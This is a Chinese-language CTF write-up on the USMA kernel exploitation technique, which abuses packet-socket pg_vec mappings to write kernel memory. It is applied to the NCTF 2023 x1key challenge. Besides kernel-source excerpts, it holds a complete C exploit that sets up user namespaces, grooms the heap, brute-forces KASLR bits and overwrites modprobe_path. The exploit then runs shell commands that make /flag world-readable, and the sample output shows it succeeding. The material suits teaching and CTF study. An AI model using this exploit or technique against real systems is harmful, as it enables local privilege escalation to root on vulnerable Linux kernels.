# USMA

360的文章提出这种利用方式[(1)](https://vul.360.net/archives/391)

## 原理

### packet socket

创建一个socket，然后调用 `setsockopt(sock, SOL_PACKET, PACKET_RX_RING, &req3, sizeof(req3)); `函数进行配置，在内核中存在调用链，会调用到 `packet_setsockopt` 函数
```cpp
static int packet_setsockopt(struct socket *sock, int level, int optname, sockptr_t optval, unsigned int optlen) {
  ...
  switch (optname) {
  ...
	case PACKET_RX_RING:
	case PACKET_TX_RING:
	{
		union tpacket_req_u req_u;
		int len;

		lock_sock(sk);
		switch (po->tp_version) {
		case TPACKET_V1:
		case TPACKET_V2:
			len = sizeof(req_u.req);
			break;
		case TPACKET_V3:
		default:
			len = sizeof(req_u.req3);
			break;
		}
		if (optlen < len) {
			ret = -EINVAL;
		} else {
			if (copy_from_sockptr(&req_u.req, optval, len))
				ret = -EFAULT;
			else
				ret = packet_set_ring(sk, &req_u, 0,
						    optname == PACKET_TX_RING);
		}
		release_sock(sk);
		return ret;
	}
  ...
}
```

调用`packet_set_ring` 函数获取 ring_buffer
```cpp
static int packet_set_ring(struct sock *sk, union tpacket_req_u *req_u,
		int closing, int tx_ring)
{
	struct pgv *pg_vec = NULL;
	struct packet_sock *po = pkt_sk(sk);
	unsigned long *rx_owner_map = NULL;
	int was_running, order = 0;
	struct packet_ring_buffer *rb;
	struct sk_buff_head *rb_queue;
	__be16 num;
	int err;
	/* Added to avoid minimal code churn */
	struct tpacket_req *req = &req_u->req;
	...
  ...
		err = -ENOMEM;
		order = get_order(req->tp_block_size);
		pg_vec = alloc_pg_vec(req, order);
    ...

out_free_pg_vec:
	if (pg_vec) {
		bitmap_free(rx_owner_map);
		free_pg_vec(pg_vec, order, req->tp_block_nr);
	}
out:
	return err;
}
```

kcalloc 获得pg_vec,每个使用`alloc_one_pg_vec_page`分配内存，`order`页级别内存
```cpp
struct pgv {
	char *buffer;
};

static struct pgv *alloc_pg_vec(struct tpacket_req *req, int order)
{
	unsigned int block_nr = req->tp_block_nr;
	struct pgv *pg_vec;
	int i;

	pg_vec = kcalloc(block_nr, sizeof(struct pgv), GFP_KERNEL | __GFP_NOWARN);
	if (unlikely(!pg_vec))
		goto out;

	for (i = 0; i < block_nr; i++) {
		pg_vec[i].buffer = alloc_one_pg_vec_page(order);
		if (unlikely(!pg_vec[i].buffer))
			goto out_free_pgvec;
	}

out:
	return pg_vec;

out_free_pgvec:
	free_pg_vec(pg_vec, order, block_nr);
	pg_vec = NULL;
	goto out;
}
```

调用 `__get_free_pages` 获得连续的内存页，如果失败，调用 `vzalloc`
```cpp
static char *alloc_one_pg_vec_page(unsigned long order)
{
	char *buffer;
	gfp_t gfp_flags = GFP_KERNEL | __GFP_COMP |
			  __GFP_ZERO | __GFP_NOWARN | __GFP_NORETRY;

	buffer = (char *) __get_free_pages(gfp_flags, order);
	if (buffer)
		return buffer;

	/* __get_free_pages failed, fall back to vmalloc */
	buffer = vzalloc(array_size((1 << order), PAGE_SIZE));
	if (buffer)
		return buffer;

	/* vmalloc failed, lets dig into swap here */
	gfp_flags &= ~__GFP_NORETRY;
	buffer = (char *) __get_free_pages(gfp_flags, order);
	if (buffer)
		return buffer;

	/* complete and utter failure */
	return NULL;
}
```

大致如下
<img src="./imgs/pgv.png" style="zoom:40%" />

### mmap

用户态mmap的时候，可以一次性将`block_nr`个block全部mmap到用户空间,用户态mmap在该环境下最终对应到内核packet_mmap()函数，将pg_vec中的虚拟地址全部重新映射给用户态
```cpp
static int packet_mmap(struct file *file, struct socket *sock,
		struct vm_area_struct *vma)
{
	struct sock *sk = sock->sk;
	struct packet_sock *po = pkt_sk(sk);
	unsigned long size, expected_size;
	struct packet_ring_buffer *rb;
	unsigned long start;
	int err = -EINVAL;
	int i;

	if (vma->vm_pgoff)
		return -EINVAL;

	mutex_lock(&po->pg_vec_lock);

	expected_size = 0;
	for (rb = &po->rx_ring; rb <= &po->tx_ring; rb++) {
		if (rb->pg_vec) {
			expected_size += rb->pg_vec_len
						* rb->pg_vec_pages
						* PAGE_SIZE;
		}
	}

	if (expected_size == 0)
		goto out;

	size = vma->vm_end - vma->vm_start;
	if (size != expected_size)
		goto out;

	start = vma->vm_start;
	for (rb = &po->rx_ring; rb <= &po->tx_ring; rb++) {
		if (rb->pg_vec == NULL)
			continue;

		for (i = 0; i < rb->pg_vec_len; i++) {
			struct page *page;
      // 获取 buffer 的虚拟地址
			void *kaddr = rb->pg_vec[i].buffer;
			int pg_num;

			for (pg_num = 0; pg_num < rb->pg_vec_pages; pg_num++) {
        // 虚拟地址转换为物理页
				page = pgv_to_page(kaddr);
        // 物理页转换为用户态虚拟地址
				err = vm_insert_page(vma, start, page);
				if (unlikely(err))
					goto out;
				start += PAGE_SIZE;
				kaddr += PAGE_SIZE;
			}
		}
	}

	atomic_long_inc(&po->mapped);
	vma->vm_ops = &packet_mmap_ops;
	err = 0;

out:
	mutex_unlock(&po->pg_vec_lock);
	return err;
}
```

页存在如下的限制：匿名页，slab页，存在类型
```cpp
static int validate_page_before_insert(struct page *page)
{
	if (PageAnon(page) || PageSlab(page) || page_has_type(page))
		return -EINVAL;
	flush_dcache_page(page);
	return 0;
}
```

内存存在4种类型，如果传入的page为`内核代码段`的页，全都可以绕过，使用USMA存在的最大问题是，其无法映射属于buddy system的页
```cpp
#define PG_buddy	0x00000080
#define PG_offline	0x00000100
#define PG_table	0x00000200
#define PG_guard	0x00000400
```

### __sys_setresuid

```cpp
/*
 * This function implements a generic ability to update ruid, euid,
 * and suid.  This allows you to implement the 4.4 compatible seteuid().
 */
long __sys_setresuid(uid_t ruid, uid_t euid, uid_t suid)
{
	struct user_namespace *ns = current_user_ns();
	const struct cred *old;
	struct cred *new;
	int retval;
	kuid_t kruid, keuid, ksuid;
	bool ruid_new, euid_new, suid_new;

	kruid = make_kuid(ns, ruid);
	keuid = make_kuid(ns, euid);
	ksuid = make_kuid(ns, suid);

	if ((ruid != (uid_t) -1) && !uid_valid(kruid))
		return -EINVAL;

	if ((euid != (uid_t) -1) && !uid_valid(keuid))
		return -EINVAL;

	if ((suid != (uid_t) -1) && !uid_valid(ksuid))
		return -EINVAL;

	old = current_cred();

	/* check for no-op */
	if ((ruid == (uid_t) -1 || uid_eq(kruid, old->uid)) &&
	    (euid == (uid_t) -1 || (uid_eq(keuid, old->euid) &&
				    uid_eq(keuid, old->fsuid))) &&
	    (suid == (uid_t) -1 || uid_eq(ksuid, old->suid)))
		return 0;

	ruid_new = ruid != (uid_t) -1        && !uid_eq(kruid, old->uid) &&
		   !uid_eq(kruid, old->euid) && !uid_eq(kruid, old->suid);
	euid_new = euid != (uid_t) -1        && !uid_eq(keuid, old->uid) &&
		   !uid_eq(keuid, old->euid) && !uid_eq(keuid, old->suid);
	suid_new = suid != (uid_t) -1        && !uid_eq(ksuid, old->uid) &&
		   !uid_eq(ksuid, old->euid) && !uid_eq(ksuid, old->suid);
	if ((ruid_new || euid_new || suid_new) &&
	    !ns_capable_setid(old->user_ns, CAP_SETUID))   // 修改这里的逻辑
		return -EPERM;

	new = prepare_creds();
	if (!new)
		return -ENOMEM;

	if (ruid != (uid_t) -1) {
		new->uid = kruid;
		if (!uid_eq(kruid, old->uid)) {
			retval = set_user(new);
			if (retval < 0)
				goto error;
		}
	}
	if (euid != (uid_t) -1)
		new->euid = keuid;
	if (suid != (uid_t) -1)
		new->suid = ksuid;
	new->fsuid = new->euid;

	retval = security_task_fix_setuid(new, old, LSM_SETID_RES);
	if (retval < 0)
		goto error;

	retval = set_cred_ucounts(new);
	if (retval < 0)
		goto error;

	flag_nproc_exceeded(new);
	return commit_creds(new);

error:
	abort_creds(new);
	return retval;
}
```

### Overwrite

通过漏洞修改 `pg_vec` 中的页到目标函数 __sys_setresuid 所在的页，patch掉 `__sys_setresuid` 中的某些校验，从而让任意用户都可以透过 setresuid syscall 来提升权限到 root。

### direct mapping area 

Linux下常用四级页表，因此关注四级页表下的内存布局

[direct mapping area](https://elixir.bootlin.com/linux/latest/source/Documentation/arch/x86/x86_64/mm.rst): 物理内存的映射；内核代码段所在的内存页在直接映射段必然存在自己的一份映射，并且读写权限必定相同（执行权限可能不同）。

## 练习

[2023 NCTF x1key](https://github.com/X1cT34m/NCTF2023/tree/main/Pwn/x1key)


简单的功能，只存在一个 `ioctl` 功能，但是传入idx=0时，导致堆的溢出，可以修改28个bit数据
```cpp
typedef struct request {
	uint32_t idx;
	uint32_t content;
} request_t;

_int64 __fastcall x1key_ioctl(file *file, unsigned int cmd, unsigned __int64 arg)
{
  __int64 result; // rax
  request request_t; // [rsp+0h] [rbp-18h] BYREF
  unsigned __int64 v5; // [rsp+8h] [rbp-10h]

  v5 = __readgsqword(0x28u);
  if ( copy_from_user(&request_t, arg, 8LL) )
  {
    result = -14LL;
  }
  else
  {
    if ( x1key_ptr && !(unsigned __int8)_virt_addr_valid() )
LABEL_14:
      BUG();
    raw_spin_lock(&spinlock_0);
    if ( cmd == 0x101 )
    {
      x1key_ptr = (unsigned __int64 *)kmalloc_trace(kmalloc_caches[5], 3520LL, 32LL);  // kmalloc-32
    }
    else if ( cmd == 0x102 && request_t.idx <= 4u )
    {
      if ( x1key_ptr )
      {
        x1key_ptr[request_t.idx - 1] &= 0xFFFFFFFFF0000000LL;
        x1key_ptr[request_t.idx - 1] += request_t.content;
      }
    }
    raw_spin_unlock(&spinlock_0);
    result = 0LL;
  }
  if ( v5 != __readgsqword(0x28u) )
    goto LABEL_14;
  return result;
}
```

### 漏洞利用

一个结构体，我们使用ko漏洞修改指针，并且结构体本身可以修改其数据，这里就可以使用 `pg_vec` 结构体，修改其buffer指针为 `/sbin/modprobe`地址，然后mmap修改其内容。

在 `direct mapping area` 另外一个在 `kernel .text`
```bash
pwndbg> search "/sbin/modprobe"
Searching for value: '/sbin/modprobe'
[pt_ffff888001f88] 0xffff88800212a0c0 '/sbin/modprobe'
[pt_ffffffff81f88] 0xffffffff8212a0c0 '/sbin/modprobe'
```

mmap存在检查，我们修改 `direct mapping area` 中的内容。并且kaslr是 `0x100000` 对齐，后20位不受影响

因此可以替换为后7位，将buffer指针指向modprobe_path，然后mmap修改内容

<img src="./imgs/USMA.png" style="zoom:40%" />

最终的exp：需要注意的一点是，后20位不变，需要爆破一下
```cpp
// $ ls -al /flag
// -rwx------    1 root     root            43 Nov 11 15:30 /flag
// $ ./exp
// [*]     Set up sandbox...
// [*]     Heap fengshui
// [*]     Set up packet socket
// [*]     USMA change pgv.buffer => modprobe_path
// [-]     Fail mmap
// [-]     Fail mmap
// [-]     Fail mmap
// [-]     Fail mmap
// [-]     Fail mmap
// [-]     Fail mmap
// [-]     Fail mmap
// [-]     Fail mmap
// [-]     Fail mmap
// [-]     Fail mmap
// [-]     Fail mmap
// [-]     Fail mmap
// [-]     Fail mmap
// [-]     Fail mmap
// [*]     Find /sbin/modprobe
// [*]     hijack modprobe_path
// /tmp/dummy: line 1: : not found
// flag{ebb007f4-9f65-4cd7-90b1-30902c4b88a9}
#define _GNU_SOURCE
// clang-format off
#include <arpa/inet.h> 

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>
#include <stdint.h>

#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sched.h>
#include <ctype.h>

#include <net/if.h>
#include <sys/types.h>
#include <sys/shm.h>
#include <sys/socket.h>
#include <linux/if_packet.h>

// clang-format on
#define COLOR_GREEN "\033[32m"
#define COLOR_RED "\033[31m"
#define COLOR_DEFAULT "\033[0m"

#define DMSG(fmt, ...) fprintf(stderr, "[*]\t" fmt "\n", ##__VA_ARGS__)

#define IMSG(fmt, ...)                                                         \
  fprintf(stderr, COLOR_GREEN "[+]\t" fmt "\n" COLOR_DEFAULT, ##__VA_ARGS__)

#define EMSG(fmt, ...)                                                         \
  fprintf(stderr, COLOR_RED "[-]\t" fmt "\n" COLOR_DEFAULT, ##__VA_ARGS__)

#define fatal(fmt, ...)                                                        \
  do {                                                                         \
    EMSG(fmt, ##__VA_ARGS__);                                                  \
    exit(EXIT_FAILURE);                                                        \
  } while (0)

void unshare_setup(void) {
  char edit[0x100];
  int tmp_fd;

  if (unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET))
    fatal("Error unshare");

  tmp_fd = open("/proc/self/setgroups", O_WRONLY);
  write(tmp_fd, "deny", strlen("deny"));
  close(tmp_fd);

  tmp_fd = open("/proc/self/uid_map", O_WRONLY);
  snprintf(edit, sizeof(edit), "0 %d 1", getuid());
  write(tmp_fd, edit, strlen(edit));
  close(tmp_fd);

  tmp_fd = open("/proc/self/gid_map", O_WRONLY);
  snprintf(edit, sizeof(edit), "0 %d 1", getgid());
  write(tmp_fd, edit, strlen(edit));
  close(tmp_fd);
}

#ifndef ETH_P_ALL
#define ETH_P_ALL 0x0003
#endif

int packet_socket_setup(uint32_t block_size, uint32_t frame_size,
                        uint32_t block_nr, uint32_t sizeof_priv, int timeout) {
  int s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
  if (s < 0) {
    fatal("Error (AF_PACKET)");
  }

  int v = TPACKET_V3;
  int rv = setsockopt(s, SOL_PACKET, PACKET_VERSION, &v, sizeof(v));
  if (rv < 0) {
    fatal("Error setsockopt (PACKET_VERSION)");
  }

  struct tpacket_req3 req3;
  memset(&req3, 0, sizeof(req3));
  req3.tp_sizeof_priv = sizeof_priv;
  req3.tp_block_nr = block_nr;
  req3.tp_block_size = block_size;
  req3.tp_frame_size = frame_size;
  req3.tp_frame_nr = (block_size * block_nr) / frame_size;
  req3.tp_retire_blk_tov = timeout;
  req3.tp_feature_req_word = 0;

  rv = setsockopt(s, SOL_PACKET, PACKET_RX_RING, &req3, sizeof(req3));
  if (rv < 0) {
    fatal("Error setsockopt (PACKET_RX_RING)");
  }

  struct sockaddr_ll sa;
  memset(&sa, 0, sizeof(sa));
  sa.sll_family = PF_PACKET;
  sa.sll_protocol = htons(ETH_P_ALL);
  sa.sll_ifindex = if_nametoindex("lo");
  sa.sll_hatype = 0;
  sa.sll_halen = 0;
  sa.sll_pkttype = 0;
  sa.sll_halen = 0;

  rv = bind(s, (struct sockaddr *)&sa, sizeof(sa));
  if (rv < 0) {
    fatal("Error bind (AF_PACKET)");
  }

  return s;
}

typedef struct request {
  uint32_t idx;
  uint32_t content;
} request_t;

int fd;

void new() {
  request_t req = {0};
  ioctl(fd, 0x101, &req);
}

void edit(uint32_t idx, uint32_t content) {
  request_t req = {.idx = idx, .content = content};
  ioctl(fd, 0x102, &req);
}

void modprobe_hijack() {
  system("echo -ne '#!/bin/sh\n/bin/chmod 777 /flag' > /tmp/x");

  system("chmod +x /tmp/x");
  system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
  system("chmod +x /tmp/dummy");
  system("/tmp/dummy");

  system("cat /flag");
  exit(0);
}

int main() {
	char *page = NULL, *modprobe_path = NULL;

  DMSG("Set up sandbox...");
  unshare_setup();

  fd = open("/dev/x1key", O_RDONLY);

  DMSG("Heap fengshui");
  int shm_fd = shmget(IPC_PRIVATE, 0x1000, IPC_CREAT | 0666);
  char *shm_ptr = shmat(shm_fd, NULL, SHM_RDONLY);
  new ();
  shmdt(shm_ptr);

  int nr = 4;
  DMSG("Set up packet socket");
  int packet_fd = packet_socket_setup(0x1000, 0x800, nr, 0, 555);

  DMSG("USMA change pgv.buffer => modprobe_path");
  for (int i = 0; i < 0x80; i++) {
    edit(0, (i << 20) | 0x2a000);
    page = mmap(NULL, 0x1000 * nr, PROT_READ | PROT_WRITE, MAP_SHARED,
                packet_fd, 0);
    if (page == MAP_FAILED) {
      DMSG("Fail mmap");
      continue;
    }
    modprobe_path = page + 0x1000 * (nr - 1) + 0xc0;
    if (!strcmp(modprobe_path, "/sbin/modprobe")) {
      DMSG("Find /sbin/modprobe");
      break;
    }
    munmap(page, 0x1000 * nr);
  }

  IMSG("hijack modprobe_path");
  strcpy(modprobe_path, "/tmp/x");
  munmap(page, 0x1000 * nr);
  modprobe_hijack();
  return EXIT_SUCCESS;
}
```

## 参考

- [USAM: share kernel code with me](https://i.blackhat.com/Asia-22/Thursday-Materials/AS-22-YongLiu-USMA-Share-Kernel-Code.pdf)
